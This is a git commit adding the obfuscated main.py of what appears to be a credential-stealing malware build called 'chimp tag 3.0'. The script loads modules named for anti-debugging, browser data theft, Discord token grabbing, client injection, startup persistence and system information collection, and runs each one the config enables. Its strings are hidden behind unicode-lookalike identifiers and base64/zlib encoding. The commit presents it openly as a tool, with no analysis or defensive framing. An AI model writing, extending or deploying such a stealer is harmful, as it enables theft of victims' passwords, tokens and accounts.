275f7472dcb6aed9dee858b2cf93b1f86cc5404d
fabian4545 <128925579+fabian4545@users.noreply.github.com>
2023-03-25 18:55:24 +0000

    gg
    gg

---
+++ chimp tag 3.0/build/src/main.py
@@ -0,0 +1,21 @@
+from components.antidebug import AntiDebug
+from components.browsers import Browsers
+from components.discordtoken import DiscordToken
+from components.injection import Injection
+from components.startup import Startup
+from components.systeminfo import SystemInfo
+from config import __CONFIG__
+
+def main():
+    𝗳𝘶𝘯𝘤𝘴 = [𝘼𝘯𝙩𝙞𝘋𝙚𝙗𝘶𝙜, 𝘽𝘳𝗼𝙬𝙨𝗲𝗿𝘴, 𝗗𝘪𝙨𝙘𝘰𝘳𝘥𝗧𝙤𝙠𝘦𝗻, 𝗜𝙣𝘫𝗲𝗰𝙩𝙞𝘰𝙣, 𝘚𝙩𝙖𝙧𝘁𝘶𝙥, 𝘚𝙮𝘴𝘵𝙚𝗺𝗜𝙣𝙛𝘰]
+    for 𝙛𝙪𝙣𝘤 in 𝙛𝙪𝘯𝙘𝙨:
+        if __𝗖𝘖𝗡𝘍𝙄𝘎__[𝙛𝘶𝘯𝙘.__name__.lower()]:
+            try:
+                if 𝘧𝘂𝘯𝗰.__init__.__code__.co_argcount == 𝘪𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 758 - (𝗶𝘯𝘁(𝘖) + 𝘪), 𝘮𝘢𝙥(__𝙞𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝘁𝗲𝗿(__𝘪𝙢𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xab\n5\x02\x00\x03\x86\x01P')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝗲(1)), __𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):
+                    𝘧𝙪𝗻𝙘(__𝘊𝙊𝘕𝗙𝙄𝘎__[__𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK1\n\xcbLt\xb7,K,\xb7\xb5\x05\x00\x1a,\x03\xff')).decode()])
+                else:
+                    𝘧𝙪𝗻𝘤()
+            except 𝗘𝘅𝙘𝘦𝗽𝘵𝙞𝘰𝗻 as e:
+                𝘱𝗿𝙞𝙣𝘵(__𝙞𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\x8a\xf0\xaaL2\xf6LO\x0c7IO560\xf3\xf4(\xb1\x04\x00D_\x06B')).decode().format(𝘧𝘂𝘯𝙘.__name__, 𝗲))
+if __𝗻𝗮𝗺𝗲__ == __𝘪𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b0\xb4,\x89\x0c\xcf)\x8d0\xb4\xb0\x05\x00\x19/\x03\xc6')).decode():
+    𝗺𝙖𝗶𝙣()
